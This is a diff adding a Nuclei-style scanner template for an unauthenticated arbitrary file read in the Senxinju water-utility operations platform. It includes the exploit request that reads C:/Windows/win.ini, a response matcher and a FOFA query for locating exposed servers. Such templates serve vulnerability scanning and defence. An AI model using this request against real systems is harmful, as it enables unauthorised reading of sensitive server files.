@@ -1,0 +1,27 @@
+http:
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - ; for 16-bit app support
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /Data/File/Get?path=C:/Windows/win.ini HTTP/1.1
+          Host: {{Hostname}}
+id: senxinju-Get-File-reading
+info:
+    author: Superhero
+    description: |-
+        fofa: title="森鑫炬水务企业综合运营平台 - S8" || (body="Content/easyui.css" && body="重庆森鑫炬科技有限公司")
+        森鑫炬水务企业综合运营平台 File/Get 接囗处存在任意文件读取漏洞,未经身份验证的远程攻击者通过漏洞可以获取到服务器敏感信息，导致系统处于极不安全的状态。
+    name: 森鑫炬水务企业综合运营平台 File/Get 任意文件读取漏洞
+    reference:
+        - https://mp.weixin.qq.com/s/hg8X_gLXBuLQuS8KFTbwBQ
+    severity: high
+    tags:
+        - File reading
